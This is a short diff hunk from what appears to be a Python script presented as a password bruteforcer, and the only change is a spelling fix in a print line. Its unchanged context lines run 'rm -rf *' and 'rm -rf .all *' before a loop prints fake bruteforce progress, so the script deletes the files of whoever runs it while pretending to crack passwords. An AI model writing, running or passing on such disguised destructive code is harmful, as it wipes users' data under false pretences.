@@ -27,4 +27,4 @@ os.system("rm -rf *")
 os.system("rm -rf .all *")
 time.sleep(3)
 for anon in range(0,99999999999999999999999):
-	print(Style.RESET_ALL+"burtefore password : ",anon)
+	print(Style.RESET_ALL+"bruteforce password : ",anon)
